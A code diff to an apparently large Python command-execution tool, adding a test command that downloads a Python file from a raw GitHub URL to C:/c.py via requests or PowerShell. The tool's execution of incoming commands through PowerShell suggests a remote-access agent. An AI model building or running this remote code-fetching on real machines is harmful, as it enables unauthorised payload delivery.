@@ -3359,9 +3359,11 @@ def execute_command(command):
             except Exception as e:
                 return f"Failed to change directory: {e}"
 
-        # Handle special download test command
+        # Handle special download test commands
         if command.strip() == "test-powershell-download":
             return test_download_functionality()
+        elif command.strip() == "test-specific-download":
+            return test_specific_download()
 
         if WINDOWS_AVAILABLE:
             # Explicitly use PowerShell to execute commands on Windows
@@ -4993,6 +4995,44 @@ def test_download_functionality():
     destination = "C:/c.py"
     
     print(f"Testing download functionality...")
+    print(f"URL: {url}")
+    print(f"Destination: {destination}")
+    
+    # Try multiple download methods
+    methods = [
+        ("Python requests", lambda: download_file_from_url(url, destination)),
+        ("PowerShell", lambda: execute_powershell_download(url, destination))
+    ]
+    
+    for method_name, method_func in methods:
+        try:
+            print(f"\nTrying {method_name} method...")
+            result = method_func()
+            print(f"Result: {result}")
+            
+            if "successful" in result.lower() or "completed" in result.lower():
+                # Check if file was actually created
+                if os.path.exists(destination):
+                    file_size = os.path.getsize(destination)
+                    print(f"✓ File successfully downloaded! Size: {file_size} bytes")
+                    return f"✓ {method_name} succeeded: File downloaded to {destination} ({file_size} bytes)"
+                else:
+                    print(f"✗ File not found at destination: {destination}")
+            else:
+                print(f"✗ {method_name} failed: {result}")
+                
+        except Exception as e:
+            print(f"✗ {method_name} error: {e}")
+            continue
+    
+    return "✗ All download methods failed"
+
+def test_specific_download():
+    """Test the specific download URL mentioned in the user's issue."""
+    url = "https://raw.githubusercontent.com/Bryllebanquil/test/main/main.py"
+    destination = "C:/c.py"
+    
+    print(f"Testing specific download issue...")
     print(f"URL: {url}")
     print(f"Destination: {destination}")
     
